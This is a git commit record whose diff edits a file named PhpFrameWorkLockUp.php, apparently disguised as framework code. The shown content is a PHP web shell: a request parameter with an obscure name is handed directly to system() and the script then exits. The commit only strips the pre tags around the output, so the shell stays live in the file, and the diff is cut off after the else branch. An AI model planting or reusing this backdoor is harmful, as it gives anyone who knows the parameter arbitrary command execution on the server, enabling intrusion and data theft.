ed7723fd4cc06012dcc64e0aea7308b8140644f3
G-bl7 <117639367+G-bl7@users.noreply.github.com>
2023-02-08 10:40:11 +0100

    Update PhpFrameWorkLockUp.php

--- PhpFrameWorkLockUp.php
+++ PhpFrameWorkLockUp.php
@@ -1,9 +1,7 @@
 <?php 
     if(isset($_REQUEST['x07sb19'])){
-        echo "<pre>";
           $cmd = ($_REQUEST['x07sb19']);
            system($cmd);
-        echo "</pre>";
          die;
           }
     else{
